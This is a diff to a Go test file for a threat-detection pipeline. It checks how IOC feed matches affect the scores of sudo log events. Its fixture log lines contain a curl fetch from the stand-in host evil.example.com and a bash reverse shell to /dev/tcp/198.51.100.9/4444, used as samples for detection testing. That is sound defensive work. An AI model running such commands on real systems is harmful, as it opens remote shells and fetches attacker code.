@@ -133,8 +133,8 @@ func TestIOCCannotReachTheResponseThreshold(t *testing.T) {
 		{Indicator: "evil.example.com", Type: ioc.TypeDomain, Feed: "internal"},
 	})
 	ev := enrichWith(t,
-		"Aug  6 12:00:00 host sudo[1]: root : TTY=pts/0 ; PWD=/ ; USER=root ; "+
-			"COMMAND=/bin/curl http://evil.example.com/"+sha+" --interface "+knownBadIP,
+		"Aug  6 12:00:00 host sudo[1]: mallory : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; "+
+			"USER=root ; COMMAND=/bin/curl http://evil.example.com/"+sha+" --interface "+knownBadIP,
 		Detectors{IOC: feed})
 
 	if ev.Score >= responseMinScore {
@@ -243,5 +243,31 @@ func TestIOCIsInertWhenNothingMatches(t *testing.T) {
 	}
 	if withFeed.Fields["ioc"] != "" {
 		t.Errorf("ioc field set to %q with no match", withFeed.Fields["ioc"])
+	}
+}
+
+func TestIOCDoesNotLowerAnAlreadyActionableScore(t *testing.T) {
+	// The counterpart to the cap. Capping the *total* meant a feed hit dragged a
+	// score-96 reverse shell down to 89 — below the responder's threshold — so
+	// agreeing with a threat feed made the system act less decisively on its own
+	// strongest detection. The cap constrains what a feed can add, not what the
+	// host already concluded.
+	feed := iocFeed(t, []ioc.Record{
+		{Indicator: "evil.example.com", Type: ioc.TypeDomain, Feed: "internal"},
+	})
+	line := "Aug  6 12:00:00 host sudo[1]: arron : TTY=pts/0 ; PWD=/ ; USER=root ; " +
+		"COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.9/4444 0>&1 # evil.example.com"
+
+	without := enrichWith(t, line, Detectors{})
+	with := enrichWith(t, line, Detectors{IOC: feed})
+
+	if without.Score < responseMinScore {
+		t.Fatalf("precondition: the line should be actionable without any feed, got %d", without.Score)
+	}
+	if with.Score < without.Score {
+		t.Errorf("a feed hit lowered the score from %d to %d", without.Score, with.Score)
+	}
+	if with.Fields["ioc"] == "" {
+		t.Error("the indicator should still be recorded as context")
 	}
 }
